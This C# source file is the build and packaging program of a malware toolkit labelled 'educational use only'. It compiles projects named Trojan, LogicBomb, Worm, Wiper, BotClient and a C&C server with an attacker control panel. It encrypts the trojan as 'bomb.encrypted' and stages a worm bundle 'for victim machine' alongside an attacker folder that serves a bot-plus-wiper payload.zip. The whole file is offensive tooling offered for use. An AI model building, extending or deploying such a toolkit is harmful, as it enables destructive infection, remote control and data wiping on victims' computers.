using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using SharedCrypto;

namespace Builder
{
    class Program
    {
        private static string SolutionDir;
        private static string BuilderOutputDir;
        private static string PayloadDir;

        private static string AttackerOutputDir;
        private static string ControlPanelDir;
        private static string WwwRootDir;

        // --- MODIFIED: Replaced MachineGuid with a randomly generated key ---
        private static string initialEncryptionKey;

        static void Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("   MALWARE BUILDER - EDUCATIONAL USE ONLY");
            Console.WriteLine("   Random Key Encryption Edition");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            try
            {
                InitializePaths();

                // --- MODIFIED: Generate a random key and save it to key.dat ---
                GenerateAndStoreInitialKey();

                // Build all projects
                BuildProject("SharedCrypto");
                BuildProject("Trojan");
                BuildProject("LogicBomb");
                BuildProject("Worm");

                // --- NEW: Build Wiper ---
                BuildProject("Wiper");

                // Build attacker toolkit components
                BuildProject("BotClient");
                BuildProject("AttackerControlPanel");
                BuildProject("C&CServer");

                // Package the worm and its payload using the random key
                EncryptTrojan();
                CreateOutputStructure();

                // Package the attacker toolkit
                CreateAttackerPackage();

                CleanupIntermediateFiles();

                Console.WriteLine();
                LogSuccess("Build completed successfully!");
                Console.WriteLine();
                LogInfo($"Worm output location: {BuilderOutputDir}");
                LogInfo($"Attacker toolkit location: {AttackerOutputDir}");
                Console.WriteLine();
                LogInfo("Final Structure:");
                LogInfo($"  product/         (For victim machine)");
                LogInfo($"    - Worm.exe, SharedCrypto.*, payload/*");
                LogInfo($"  attack/          (For attacker machine)");
                LogInfo($"    - C&CServer.exe, etc.");
                LogInfo($"    - control panel/ (AttackerControlPanel.exe, etc.)");
                LogInfo($"    - wwwroot/ (payload.zip)");

                Console.WriteLine();
                // --- MODIFIED: Updated warning message ---
                LogWarning("Note: bomb.encrypted is encrypted with a RANDOMLY GENERATED key.");
                LogWarning("The key is stored in 'product/payload/key.dat'.");
                LogWarning("The Worm will generate a new random key for each victim it infects.");
            }
            catch (Exception ex)
            {
                Console.WriteLine();
                LogError("BUILD FAILED!");
                LogError($"Error: {ex.Message}");
                Console.WriteLine();
                LogError("Stack trace:");
                Console.WriteLine(ex.StackTrace);
                Environment.Exit(1);
            }

            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        private static void InitializePaths()
        {
            LogInfo("Initializing paths...");

            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            SolutionDir = Directory.GetParent(currentDir).Parent.Parent.Parent.FullName;

            BuilderOutputDir = Path.Combine(currentDir, "product");
            PayloadDir = Path.Combine(BuilderOutputDir, "payload");

            AttackerOutputDir = Path.Combine(currentDir, "attack");
            ControlPanelDir = Path.Combine(AttackerOutputDir, "control panel");
            WwwRootDir = Path.Combine(AttackerOutputDir, "wwwroot");

            if (Directory.Exists(BuilderOutputDir)) Directory.Delete(BuilderOutputDir, true);
            if (Directory.Exists(AttackerOutputDir)) Directory.Delete(AttackerOutputDir, true);

            Directory.CreateDirectory(BuilderOutputDir);
            Directory.CreateDirectory(PayloadDir);

            Directory.CreateDirectory(AttackerOutputDir);
            Directory.CreateDirectory(ControlPanelDir);
            Directory.CreateDirectory(WwwRootDir);

            LogSuccess($"Solution directory: {SolutionDir}");
            LogSuccess($"Output directories: 'product' and 'attack'");
            Console.WriteLine();
        }

        // --- NEW: Replaces the old GetMachineGuid method ---
        private static void GenerateAndStoreInitialKey()
        {
            LogInfo("Generating initial random key for encryption...");
            initialEncryptionKey = CryptoUtils.GenerateRandomKey();
            LogSuccess($"Generated Key: {initialEncryptionKey}");

            // Save the key to key.dat in the payload folder
            string keyFilePath = Path.Combine(PayloadDir, "key.dat");
            File.WriteAllText(keyFilePath, initialEncryptionKey);
            LogSuccess($"Initial key saved to product/payload/key.dat");
            Console.WriteLine();

            LogInfo("Deriving encryption keys from random string...");
            CryptoUtils.LogDerivedKeys(initialEncryptionKey);
            Console.WriteLine();
        }

        private static void BuildProject(string projectName)
        {
            LogInfo($"Building {projectName} project...");

            // --- BUG FIX: Correctly handle '&' in project name ---
            string csprojName = projectName.Replace("&", "n");
            string projectPath = Path.Combine(SolutionDir, projectName, $"{csprojName}.csproj");

            if (!File.Exists(projectPath))
            {
                throw new FileNotFoundException($"Project file not found: {projectPath}");
            }

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = $"build \"{projectPath}\" --configuration Debug",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    Console.WriteLine(output);
                    Console.WriteLine(error);
                    throw new Exception($"Failed to build {projectName}. Exit code: {process.ExitCode}");
                }
            }
            LogSuccess($"{projectName} built successfully");
            Console.WriteLine();
        }

        private static void EncryptTrojan()
        {
            LogInfo("Encrypting Trojan.exe with the generated random key...");
            string trojanExePath = FindExecutable("Trojan", "Trojan.exe");
            LogInfo($"Found Trojan.exe at: {trojanExePath}");
            string encryptedOutputPath = Path.Combine(PayloadDir, "bomb.encrypted");

            // --- MODIFIED: Use the random key string for encryption ---
            CryptoUtils.EncryptFile(trojanExePath, encryptedOutputPath, initialEncryptionKey);

            LogSuccess($"Trojan.exe encrypted successfully to 'bomb.encrypted'");
            Console.WriteLine();
        }

        private static void CreateOutputStructure()
        {
            LogInfo("Creating 'product' folder structure...");
            CopyFileToOutput("Worm", "Worm.exe", BuilderOutputDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.dll", BuilderOutputDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.pdb", BuilderOutputDir);
            CopyFileToOutput("LogicBomb", "LogicBomb.exe", PayloadDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.dll", PayloadDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.pdb", PayloadDir);
            LogSuccess("bomb.encrypted already in product/payload folder");
            // --- NEW: Confirm key.dat is also present ---
            LogSuccess("key.dat already created in product/payload folder");
            Console.WriteLine();
        }

        private static void CreateAttackerPackage()
        {
            LogInfo("Creating 'attack' folder structure...");

            //string botClientOutputDir = FindBuildOutputDirectory("BotClient");
            //string zipPath = Path.Combine(WwwRootDir, "payload.zip");
            //ZipFile.CreateFromDirectory(botClientOutputDir, zipPath);
            //LogSuccess("Packaged BotClient into attack/wwwroot/payload.zip");
            LogInfo("Structuring payload with Wiper subfolder...");

            // 1. Tạo thư mục tạm để sắp xếp file
            string tempStagingDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Directory.CreateDirectory(tempStagingDir);

            try
            {
                // 2. Copy BotClient vào thư mục gốc của Temp
                string botClientOutputDir = FindBuildOutputDirectory("BotClient");
                CopyDirectoryContents(botClientOutputDir, tempStagingDir);

                // 3. Tạo thư mục con "wiper" trong Temp
                string wiperSubDir = Path.Combine(tempStagingDir, "wiper");
                Directory.CreateDirectory(wiperSubDir);

                // 4. Copy Wiper vào thư mục con "wiper"
                string wiperOutputDir = FindBuildOutputDirectory("Wiper");
                CopyDirectoryContents(wiperOutputDir, wiperSubDir);

                // 5. Nén thư mục Temp thành payload.zip
                string zipPath = Path.Combine(WwwRootDir, "payload.zip");
                ZipFile.CreateFromDirectory(tempStagingDir, zipPath);
                LogSuccess("Packaged BotClient + Wiper into attack/wwwroot/payload.zip");
            }
            finally
            {
                // Dọn dẹp thư mục tạm
                if (Directory.Exists(tempStagingDir))
                {
                    Directory.Delete(tempStagingDir, true);
                }
            }

            string cncServerOutputDir = FindBuildOutputDirectory("C&CServer");
            CopyDirectoryContents(cncServerOutputDir, AttackerOutputDir);
            LogSuccess("Staged C&CServer into 'attack' folder");

            string controlPanelOutputDir = FindBuildOutputDirectory("AttackerControlPanel");
            CopyDirectoryContents(controlPanelOutputDir, ControlPanelDir);
            LogSuccess("Staged AttackerControlPanel into 'attack/control panel' folder");

            Console.WriteLine();
        }

        private static void CopyFileToOutput(string projectName, string fileName, string destinationDir)
        {
            string sourcePath = FindExecutable(projectName, fileName);
            string destPath = Path.Combine(destinationDir, fileName);
            File.Copy(sourcePath, destPath, true);
            LogSuccess($"Copied {fileName} to {Path.GetFileName(destinationDir)}");
        }

        private static string FindExecutable(string projectName, string exeName)
        {
            string[] possiblePaths = new[]
            {
                Path.Combine(SolutionDir, projectName, "bin", "Debug", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net472", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net48", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "netstandard2.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "netstandard2.1", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net6.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net7.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net8.0", exeName)
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path)) return path;
            }
            throw new FileNotFoundException($"{exeName} not found for project {projectName}");
        }

        private static string FindBuildOutputDirectory(string projectName)
        {
            string[] possiblePaths = new[]
            {
                Path.Combine(SolutionDir, projectName, "bin", "Debug"),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net8.0"),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net7.0"),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net6.0"),
            };

            foreach (string path in possiblePaths)
            {
                if (Directory.Exists(path) && Directory.GetFiles(path).Length > 0)
                {
                    return path;
                }
            }
            throw new DirectoryNotFoundException($"Build output directory not found for project {projectName}");
        }

        private static void CopyDirectoryContents(string sourceDir, string destDir)
        {
            DirectoryInfo dir = new DirectoryInfo(sourceDir);
            if (!dir.Exists) throw new DirectoryNotFoundException($"Source directory does not exist: {sourceDir}");

            Directory.CreateDirectory(destDir);

            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destDir, file.Name);
                file.CopyTo(targetFilePath, true);
            }

            foreach (DirectoryInfo subDir in dir.GetDirectories())
            {
                string newDestinationDir = Path.Combine(destDir, subDir.Name);
                CopyDirectoryContents(subDir.FullName, newDestinationDir);
            }
        }

        private static void CleanupIntermediateFiles()
        {
            LogInfo("Cleaning up intermediate files...");
            try
            {
                // --- FIXED: Use the correct folder name with '&' ---
                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan", "SharedCrypto", "BotClient", "AttackerControlPanel", "C&CServer", "Wiper" };

                foreach (string project in projectsToClean)
                {
                    string binPath = Path.Combine(SolutionDir, project, "bin");
                    if (Directory.Exists(binPath))
                    {
                        Directory.Delete(binPath, true);
                        LogSuccess($"Cleaned {project}/bin folder");
                    }

                    string objPath = Path.Combine(SolutionDir, project, "obj");
                    if (Directory.Exists(objPath))
                    {
                        Directory.Delete(objPath, true);
                        LogSuccess($"Cleaned {project}/obj folder");
                    }
                }
                Console.WriteLine();
            }
            catch (Exception ex)
            {
                LogWarning($"Cleanup warning: {ex.Message}");
            }
        }

        private static void LogInfo(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[INFO] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogSuccess(string message)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[SUCCESS] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogWarning(string message)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[WARNING] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[ERROR] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }
    }
}